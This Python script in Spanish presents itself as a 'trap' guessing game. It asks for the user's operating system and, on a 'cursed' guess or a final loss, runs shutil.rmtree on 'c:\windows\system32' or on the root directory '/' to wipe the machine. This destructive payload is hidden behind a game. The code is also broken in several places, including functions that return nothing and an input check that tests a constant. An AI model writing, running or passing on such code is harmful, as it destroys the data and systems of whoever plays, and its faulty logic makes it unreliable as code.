
import time
import random
import os
import shutil

i = True
def sistema():
    sis = 0
    so = True

    while so == True:
        sis = int(input("¿En que sistema operativo estás? (Es necesario para el funcionamiento del juego) 1 = Windows /// 2 = Rama de Debian /// 3 = Rama de RedHat /// 4 = MacOS "))
        if sis == 5 or sis > 5 or sis < 1:
            print("¡Eso no es na opción válida!")
        else:
            so = False
    return sis 

sis = sistema()

while i == True:
    print("Has caido en la trampa!")
    time.sleep(3)
    print("Vamos a jugar a un juego.")
    time.sleep(3)
    print("Tienes 10 intentos para adivinar un numero totalmente aleatirio del 1 al 50.")
    time.sleep(3)
    print("Me vas a dar una lista de 3 numeros por inento.")
    time.sleep(3)
    print("Aunque este numero aleatorio, va a cambiar a cada intento para añadirle un poco de dificultad 😈 ")
    time.sleep(3)
    prim = input("¿Crees que es dificil? (si/no)")
    if prim in ["si", "s", "Si", "SI"]:
        print("Me da igual tu opinion, ahora, también añadire un número maldito... ")
        time.sleep(2)
        print("Habrá un número aleatorio el cual si aciertas, se formateará tu pc :) ")
    else:
        print("Me da igual tu opinion, ahora, también añadire un número maldito... ")
        time.sleep(2)
        print("Habrá un número aleatorio el cual si aciertas, se formateará tu pc :) ")

    time.sleep(3)
    print("Perfecto, empecemos con tu primer intento. ")
    u = 0
    while u <11:


        def crearlista():
            p = []
            l = 0
            while l <3:
                o = input('Escribe tus numeros de 1 en 1 dandole a Enter ')
                while not o.isdigit() or int(0) < 0 or int(0) > 51:
                    print("Ese número no es válido. Por favor, inserta uno del 0 al 50")
                    o = input('Escribe tus numeros de 1 en 1 dandole a Enter ') 
                l = l+1
                p.append(o)
            return p
        

        def numerobueno():
            nb = random.randint(0,50)
        
        def numeromalo():
            nm = random.randint(0,50)
        nb = numerobueno()
        nm = numeromalo()
        if nb == nm and nm == 50:
            nm == nm-1
            if nb == nm and nm < 50:
                nm == nm+1

        lista = crearlista()

        for lista in nb:
            print("Te has salvado, has adivinado el número, que era {}".format(nb))
        for lista in nm:
            print("JAJAJAJAJAJA Has adivinado el numero malo, ahora te doy 3 segundos para despedirte de tu ordenador ")
            time.sleep(3)
            if sis == 1:
                shutil.rmtree("c:\windows\system32")
                if sis == 2 or sis == 3 or sis == 4:
                    shutil.rmtree("/")
        u = u+1
        print("Este es tu intento número {}".format(u))
    if u == 11 and sis == 1:
        print("Se han acabado tus intentos, has perdido, por lo que igualmente serás castigado")
        shutil.rmtree("c:\windows\system32")
        if u == 11 and sis == 2 or sis == 3 or sis == 4:
            shutil.rmtree("/")
        
        
        

                    
                    


